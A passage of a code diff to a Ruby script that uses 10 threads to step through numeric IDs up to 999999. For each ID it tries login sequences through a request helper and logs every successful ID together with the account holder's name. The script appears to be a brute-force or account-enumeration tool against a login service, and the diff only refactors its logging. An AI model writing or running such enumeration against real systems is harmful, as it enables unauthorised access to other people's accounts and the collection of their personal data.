@@ -72,26 +72,26 @@ class InsNum
   end
 end
 
-open LOG_FILE, "a" do |log_file|
-  current_id = InsNum.new ARGV[0].to_i
+current_id = InsNum.new ARGV[0].to_i
 
-  10.times do
-    threads << Thread.new do
-      while current_id.value < 999999 do
-        x = current_id.get_value
-        puts "?".blue + " #{x}"
-        LOGIN_SEQ.each do |seq|
-          r = do_req x, seq, LOGIN_DIS
-          if r[:success]
+10.times do
+  threads << Thread.new do
+    while current_id.value < 999999 do
+      x = current_id.get_value
+      puts "?".blue + " #{x}"
+      LOGIN_SEQ.each do |seq|
+        r = do_req x, seq, LOGIN_DIS
+        if r[:success]
+          open LOG_FILE, "a" do |log_file|
             log_file.puts "#{seq} #{x} #{r[:name]}"
-            puts "!".red + " #{x} #{seq} #{r[:name]}"
           end
+          puts "!".red + " #{x} #{seq} #{r[:name]}"
         end
       end
     end
   end
+end
 
-  threads.each do |thread|
-    thread.join
-  end
+threads.each do |thread|
+  thread.join
 end
